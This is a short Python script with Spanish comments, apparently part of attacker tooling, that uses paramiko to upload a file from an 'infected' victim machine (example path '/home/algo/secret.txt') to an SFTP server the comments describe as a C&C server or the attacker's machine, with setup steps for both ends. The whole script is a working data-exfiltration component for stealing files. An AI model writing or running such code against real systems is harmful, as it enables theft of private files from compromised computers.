#!/bin/python
# -*- coding: utf-8 -*-

#En el server C&C o en el equipo del atacante se realiza lo mismo que en siguiente link:
#https://devtidbits.com/2011/06/29/implement-a-sftp-service-for-ubuntudebian-with-a-chrooted-isolated-file-directory/



#En el cliente se instala pip y el modulo de paramiko para ello hacer lo sig:
#Instalar install python-dev build-essential libcanberra-gtk3-module  -y 
#Bajar el script get-pip.py  del sitio: https://pip.pypa.io/en/stable/installing/
#Ejecutar ese script con python
#pip install pycrypto
#pip install paramiko


#Imprimiendo pantalla


import paramiko


def subir(rutaAtacante,rutaVictima, host, username, password ):
#La rutaVictima es la del equipo infectado, se igresa el nombre del archivo y su ruta ejemplo "/home/algo/secret.txt"
#La rutaAtacante es la ruta del equipo qque se usará para 
#La ruta 
    port = 22	
    transport = paramiko.Transport((host, port))
    transport.connect(username = username, password = password)
    sftp = paramiko.SFTPClient.from_transport(transport)
    sftp.put(rutaVictima, rutaAtacante)
	
